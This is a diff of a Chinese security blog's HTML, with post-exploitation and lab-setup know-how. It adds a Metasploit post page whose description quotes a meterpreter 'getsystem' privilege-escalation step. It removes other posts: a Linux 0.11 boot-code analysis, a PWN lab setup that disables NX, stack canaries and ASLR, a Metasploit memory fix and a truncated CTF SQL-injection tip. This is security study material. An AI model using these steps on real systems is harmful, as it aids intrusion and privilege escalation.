@@ -4,15 +4,19 @@
 <head>
   <meta charset="utf-8">
   
-  <title></title>
+  <title>metasploit在后渗透中的作用 | </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title">
-<meta property="og:url" content="https://www.daikersec.com/index.html">
+  <meta name="description" content="0x00 前言这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。 0x01 权限提升 getsystem 123456meterpreter &amp;gt; getuidServer username: TEST\Administratormeterpreter &amp;gt; getsy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="metasploit在后渗透中的作用">
+<meta property="og:url" content="https://www.daikersec.com/post/9668f403.html">
 <meta property="og:site_name">
+<meta property="og:description" content="0x00 前言这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。 0x01 权限提升 getsystem 123456meterpreter &amp;gt; getuidServer username: TEST\Administratormeterpreter &amp;gt; getsy">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-03-22T11:14:41.522Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title">
+<meta name="twitter:title" content="metasploit在后渗透中的作用">
+<meta name="twitter:description" content="0x00 前言这里简要探究下meterpreter 的使用。meterpreter有个很有效的功能就是，除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。 0x01 权限提升 getsystem 123456meterpreter &amp;gt; getuidServer username: TEST\Administratormeterpreter &amp;gt; getsy">
   
     <link rel="alternative" href="/atom.xml" title="" type="application/atom+xml">
   
@@ -64,9 +68,7 @@
   </div>
 </header>
     <div class="outer">
-      <section id="main">
-  
-    <article id="post-metasploit在后渗透中的作用" class="article article-type-post" itemscope itemprop="blogPost">
+      <section id="main"><article id="post-metasploit在后渗透中的作用" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/post/9668f403.html" class="article-date">
   <time datetime="2018-03-19T05:23:50.000Z" itemprop="datePublished">2018-03-19</time>
@@ -79,8 +81,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/post/9668f403.html">metasploit在后渗透中的作用</a>
+    <h1 class="article-title" itemprop="name">
+      metasploit在后渗透中的作用
     </h1>
   
 
@@ -147,245 +149,20 @@
     </footer>
   </div>
   
-</article>
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-Linuxv0.11源码分析之引导启动程序一" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/post/b309a0f3.html" class="article-date">
-  <time datetime="2018-03-19T05:16:28.000Z" itemprop="datePublished">2018-03-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/post/b309a0f3.html">Linuxv0.11源码分析之引导启动程序一</a>
-    </h1>
+    <a href="/post/b309a0f3.html" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Linuxv0.11源码分析之引导启动程序一</div>
+    </a>
   
+</nav>
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-大体流程"><a href="#0x00-大体流程" class="headerlink" title="0x00 大体流程"></a>0x00 大体流程</h2><p>这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，<br>最后将程序的控制权交给<code>setup.s</code></p>
-<h2 id="0x01-bios做了什么"><a href="#0x01-bios做了什么" class="headerlink" title="0x01 bios做了什么"></a>0x01 bios做了什么</h2><p>按下电源键的时候，CPU硬件逻辑设计为强行将CS的值置为0F000,IP的值置为0xFFF0,这样CS：IP就指向0xFFFF0这个地址位置。<br>而bios的入口地址就设计在这个位置。这个时候bios开始运行。bios会读取并检测显卡，内存等电脑硬件。<br>接下来bios会在内存中加载向量表和终端服务程序。此时内存的信息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00000-0x003FF 中断向量表(1kb)</span><br><span class="line">0x00400-0x004FF BIOS数据区(256b)</span><br><span class="line">....</span><br><span class="line">57kb以后-xxxx(8kb)的终端服务程序</span><br></pre></td></tr></table></figure></p>
-<p>接下来bios会触发0x19中断<br>这个中断对应的中断服务程序的功能是将0号磁头对应盘面的0磁道1扇区的内容(共512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR）)复制至内存<code>0x07C00</code>处</p>
-<h2 id="0x02-将随后的4个扇区加载进内存"><a href="#0x02-将随后的4个扇区加载进内存" class="headerlink" title="0x02 将随后的4个扇区加载进内存"></a>0x02 将随后的4个扇区加载进内存</h2><p>从入口开始看<br><code>boot/bootsect.s</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">entry _start</span><br><span class="line">_start:</span><br><span class="line">	mov	ax,#BOOTSEG</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	mov	ax,#INITSEG</span><br><span class="line">	mov	es,ax</span><br><span class="line">	mov	cx,#256</span><br><span class="line">	sub	si,si</span><br><span class="line">	sub	di,di</span><br><span class="line">	rep</span><br><span class="line">	movw !bootsec</span><br></pre></td></tr></table></figure></p>
-<p>这段代码是含义是将<code>BOOTSEG</code>后面512个字节移到<code>INITSEG</code>后面的512个字节<br>然后看下<code>BOOTSEG</code>和<code>INITSEG</code>的定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BOOTSEG  = 0x07c0			! 启动扇区被BIOS加载的位置</span><br><span class="line">INITSEG  = 0x9000			! 启动扇区将移动到的新位置</span><br></pre></td></tr></table></figure></p>
-<p>也就是说我们在前一步通过bios加载进内存的512字节，一开始会先把自己512字节内容由0x07c00复制到0x90000处<br>接下来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmpi	go,INITSEG !跳转到0x90000处继续执行</span><br></pre></td></tr></table></figure></p>
-<p>这里jmpi的格式是<code>jmpi ip,cs</code>。如果没有这一步，程序接下来会执行0x07C00为开始的那一段的go处。<br>但是这里跳转到0x90000开始的那一段内存的go处。跳转到复制完的地方执行。<br>接下来继续看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">go:	mov	ax,cs</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	mov	es,ax</span><br><span class="line">	! put stack at 0x9ff00.</span><br><span class="line">	mov	ss,ax</span><br><span class="line">	mov	sp,#0xFF00		! arbitrary value &gt;&gt;512</span><br></pre></td></tr></table></figure></p>
-<p>前面已经改变了cs，现在对ds，es，sp的值进行设置<br>继续看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load_setup:</span><br><span class="line">	mov	dx,#0x0000		! drive 0, head 0</span><br><span class="line">	mov	cx,#0x0002		! sector 2, track 0</span><br><span class="line">	mov	bx,#0x0200		! address = 512, in INITSEG</span><br><span class="line">	mov	ax,#0x0200+SETUPLEN	! service 2, nr of sectors</span><br><span class="line">	int	0x13			! read it</span><br></pre></td></tr></table></figure></p>
-<p>首先查下bios的0x13中断是什么意思<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8e0e5dcf8d244507.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="BIOS中断表"><br>对应表格查阅，可以看出这几行代码的意思是把从第二个扇区开始的4个扇区(即setup.s，在boot/setup.s里面)读进内存es:bx处，<br>即0x90200处。前面说到第一个扇区的内存被复制到0x90000处，0x90200离0x90000有256字节，刚好是第一个扇区的长度。<br>也就是说第一个扇区和第二个扇区相邻。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jnc	ok_load_setup		! ok - continue</span><br><span class="line">	mov	dx,#0x0000</span><br><span class="line">	mov	ax,#0x0000		! reset the diskette</span><br><span class="line">	int	0x13</span><br><span class="line">	j	load_setup</span><br></pre></td></tr></table></figure>
-<p>这段代码是判断是否成功，没有成功的话，系统复位之后再重新读一次。</p>
-<h2 id="0x03-将后面的240个扇区加载进内存"><a href="#0x03-将后面的240个扇区加载进内存" class="headerlink" title="0x03 将后面的240个扇区加载进内存"></a>0x03 将后面的240个扇区加载进内存</h2><p>接下来我们将第三批程序载入内存<br>从105行开始<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">! ok, we&apos;ve written the message, now</span><br><span class="line">! we want to load the system (at 0x10000)</span><br><span class="line"></span><br><span class="line">	mov	ax,#SYSSEG</span><br><span class="line">	mov	es,ax		! segment of 0x010000</span><br><span class="line">	call	read_it</span><br><span class="line">	call	kill_motor</span><br></pre></td></tr></table></figure></p>
-<p>这段代码的功能和载入setup.s一样，，只不过载入setup.s只有四个扇区，这段代码足足占了240个扇区。花的时间比较长，<br>为了防止用户以为机器故障，linus加了一个输出</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov	ah,#0x03		! read cursor pos</span><br><span class="line">xor	bh,bh</span><br><span class="line">int	0x10</span><br><span class="line"></span><br><span class="line">mov	cx,#24</span><br><span class="line">mov	bx,#0x0007		! page 0, attribute 7 (normal)</span><br><span class="line">mov	bp,#msg1</span><br><span class="line">mov	ax,#0x1301		! write string, move cursor</span><br><span class="line">int	0x10</span><br></pre></td></tr></table></figure>
-<p>调用0x10中断输出<code>Loading system ...</code><br>看下0x10中断的内容<br><img src="https://upload-images.jianshu.io/upload_images/5443560-e41ee43275a295b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<p>下面我们来具体看下这240个扇区怎么载入的</p>
-<p>我们先看下<code>read_it</code>子模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">read_it:</span><br><span class="line">	mov ax,es</span><br><span class="line">	test ax,#0x0fff</span><br><span class="line">die:	jne die			! 确保es必须是64kb</span><br><span class="line">	xor bx,bx		!清空bx,使得bs可以被用作段内基址</span><br><span class="line">rp_read:</span><br><span class="line">	mov ax,es</span><br><span class="line">	cmp ax,#ENDSEG		! have we loaded all yet?</span><br><span class="line">	jb ok1_read</span><br><span class="line">	ret</span><br><span class="line">ok1_read:</span><br><span class="line">	seg cs</span><br><span class="line">	mov ax,sectors</span><br><span class="line">	sub ax,sread</span><br><span class="line">	mov cx,ax</span><br><span class="line">	shl cx,#9</span><br><span class="line">	add cx,bx</span><br><span class="line">	jnc ok2_read</span><br><span class="line">	je ok2_read</span><br><span class="line">	xor ax,ax</span><br><span class="line">	sub ax,bx</span><br><span class="line">	shr ax,#9</span><br><span class="line">ok2_read:</span><br><span class="line">	call read_track</span><br><span class="line">	mov cx,ax</span><br><span class="line">	add ax,sread</span><br><span class="line">	seg cs</span><br><span class="line">	cmp ax,sectors</span><br><span class="line">	jne ok3_read</span><br><span class="line">	mov ax,#1</span><br><span class="line">	sub ax,head</span><br><span class="line">	jne ok4_read</span><br><span class="line">	inc track</span><br><span class="line">ok4_read:</span><br><span class="line">	mov head,ax</span><br><span class="line">	xor ax,ax</span><br><span class="line">ok3_read:</span><br><span class="line">	mov sread,ax</span><br><span class="line">	shl cx,#9</span><br><span class="line">	add bx,cx</span><br><span class="line">	jnc rp_read</span><br><span class="line">	mov ax,es</span><br><span class="line">	add ax,#0x1000</span><br><span class="line">	mov es,ax</span><br><span class="line">	xor bx,bx</span><br><span class="line">	jmp rp_read</span><br><span class="line"></span><br><span class="line">read_track:</span><br><span class="line">	push ax</span><br><span class="line">	push bx</span><br><span class="line">	push cx</span><br><span class="line">	push dx</span><br><span class="line">	mov dx,track</span><br><span class="line">	mov cx,sread</span><br><span class="line">	inc cx</span><br><span class="line">	mov ch,dl</span><br><span class="line">	mov dx,head</span><br><span class="line">	mov dh,dl</span><br><span class="line">	mov dl,#0</span><br><span class="line">	and dx,#0x0100</span><br><span class="line">	mov ah,#2</span><br><span class="line">	int 0x13</span><br><span class="line">	jc bad_rt</span><br><span class="line">	pop dx</span><br><span class="line">	pop cx</span><br><span class="line">	pop bx</span><br><span class="line">	pop ax</span><br><span class="line">	ret</span><br><span class="line">bad_rt:	mov ax,#0</span><br><span class="line">	mov dx,#0</span><br><span class="line">	int 0x13</span><br><span class="line">	pop dx</span><br><span class="line">	pop cx</span><br><span class="line">	pop bx</span><br><span class="line">	pop ax</span><br><span class="line">	jmp read_track</span><br></pre></td></tr></table></figure>
-<p>接下来看<code>kill_motor</code>子模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kill_motor:</span><br><span class="line">	push dx</span><br><span class="line">	mov dx,#0x3f2</span><br><span class="line">	mov al,#0</span><br><span class="line">	outb</span><br><span class="line">	pop dx</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-确认下根设备号"><a href="#0x04-确认下根设备号" class="headerlink" title="0x04 确认下根设备号"></a>0x04 确认下根设备号</h2><h2 id="0x05-将程序控制权转交给setup-s"><a href="#0x05-将程序控制权转交给setup-s" class="headerlink" title="0x05 将程序控制权转交给setup.s"></a>0x05 将程序控制权转交给setup.s</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SETUPSEG = 0x9020</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">! after that (everyting loaded), we jump to</span><br><span class="line">! the setup-routine loaded directly after</span><br><span class="line">! the bootblock:</span><br><span class="line"></span><br><span class="line">	jmpi	0,SETUPSEG</span><br></pre></td></tr></table></figure>
-<p>前面说到0x13中断将第二个扇区到第五个扇区的内容(即setup.s的内容)加载到以0x90200处地址，现在跳转到那边，把控制权交给他</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-        <a data-url="https://www.daikersec.com/post/b309a0f3.html" data-id="cjfmscznn0001t4uh8w1sm0lu" class="article-share-link">Share</a>
-      
-
-      
-
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
-
-    </footer>
-  </div>
   
 </article>
 
-
-  
-    <article id="post-PWN环境搭建" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/post/11af4bf6.html" class="article-date">
-  <time datetime="2018-03-18T07:02:16.000Z" itemprop="datePublished">2018-03-18</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/pwn/">pwn</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/post/11af4bf6.html">PWN环境搭建</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-关闭安全机制"><a href="#0x00-关闭安全机制" class="headerlink" title="0x00 关闭安全机制"></a>0x00 关闭安全机制</h2><p>1.关掉DEP/NX（堆栈不可执行）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc  -z execstack -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p>
-<p>2.关掉Stack Protector/Canary（栈保护）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p>
-<p>3.关掉程序ASLR/PIE（程序随机化保护）<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></p>
-<p>4.关闭整个linux系统的ASLR保护<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su - </span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></p>
-<p>5.打开整个linux系统的ASLR保护<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su -</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></p>
-<ol>
-<li>64位linux下面的GCC编译出一个32位可执行程序 加参数<code>- m32</code><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z execstack -fno-stack-protector -o pwnme pwnme.c</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>另外说明下在ubuntu上如果要用 -m32 参数就要安装如下的库：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install build-essential module-assistant  </span><br><span class="line">$ sudo apt-get install gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x01-安装pwntools"><a href="#0x01-安装pwntools" class="headerlink" title="0x01 安装pwntools"></a>0x01 安装pwntools</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-安装peda"><a href="#0x02-安装peda" class="headerlink" title="0x02 安装peda"></a>0x02 安装peda</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-绑定端口"><a href="#0x03-绑定端口" class="headerlink" title="0x03 绑定端口"></a>0x03 绑定端口</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:端口号，reuseaddr，fork <span class="built_in">exec</span>:程序位置</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      
-        <a data-url="https://www.daikersec.com/post/11af4bf6.html" data-id="cjfmsczok0009t4uhi3db0e3v" class="article-share-link">Share</a>
-      
-
-      
-
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-解决msf内存不足不能启动的问题" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/post/376537a6.html" class="article-date">
-  <time datetime="2018-03-15T06:50:54.000Z" itemprop="datePublished">2018-03-15</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/tools/">tools</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/post/376537a6.html">解决msf内存不足不能启动的问题</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 问题"></a>0x00 问题</h2><p>在vps里面跑msf，经常遇到内存不足，提示如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos;: Cannot allocate memory - infocmp (Errno::ENOMEM)</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1815:in `get_term_capabilities&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2027:in `_rl_init_terminal_io&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2564:in `readline_initialize_everything&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:3849:in `rl_initialize&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4868:in `readline&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:100:in `pgets&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:375:in `get_input_line&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:191:in `run&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start&apos;</span><br><span class="line">	from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start&apos;</span><br></pre></td></tr></table></figure></p>
-<p>内存不足，一直没有好的解决方案。最近看Linux的时候，看到Swap分区，想到一个解决方案</p>
-<h2 id="0x01-解决方案"><a href="#0x01-解决方案" class="headerlink" title="0x01 解决方案"></a>0x01 解决方案</h2><p>vps默认安装的时候是没有安装swap分区的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@daiker ~]# top</span><br><span class="line">top - 06:35:36 up 14:57,  2 users,  load average: 0.21, 0.09, 0.07</span><br><span class="line">Tasks:  86 total,   1 running,  85 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.5 us,  0.0 sy,  0.0 ni, 99.5 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :  1016108 total,   240924 free,   518952 used,   256232 buff/cache</span><br><span class="line">KiB Swap:        0 total,        0 free,        0 used.   247996 avail Mem</span><br></pre></td></tr></table></figure></p>
-<p>我们可以给分配一个swap分区,命令如下</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/zero of=/home/swap bs=1024 count=512000</span><br><span class="line">/sbin/mkswap /home/swap</span><br><span class="line">/sbin/swapon /home/swap</span><br></pre></td></tr></table></figure>
-<p>然后查看swap分区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@daiker ~]# free -h</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           992M        506M         74M         92M        411M        242M</span><br><span class="line">Swap:          499M          0B        499M</span><br></pre></td></tr></table></figure></p>
-<p>msf成功开启</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-        <a data-url="https://www.daikersec.com/post/376537a6.html" data-id="cjfmsczpr000tt4uhsdk53nwx" class="article-share-link">Share</a>
-      
-
-      
-
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/">tools</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-CTF中SQL注入字段名被过滤小技巧" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/post/a62e54a0.html" class="article-date">
-  <time datetime="2018-03-12T03:04:07.000Z" itemprop="datePublished">2018-03-12</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/注入/">注入</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/post/a62e54a0.html">CTF中SQL注入字段名被过滤小技巧</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来</p>
-<h1 id="0x01-问题引入"><a href="#0x01-问题引入" class="headerlink" title="0x01 问题引入"></a>0x01 问题引入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+--------+-----------+</span><br><span class="line">| points | flag      |</span><br><span class="line">+--------+-----------+</span><br><span class="line">| 31     | daiker666 |</span><br><span class="line">+--------+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。</p>
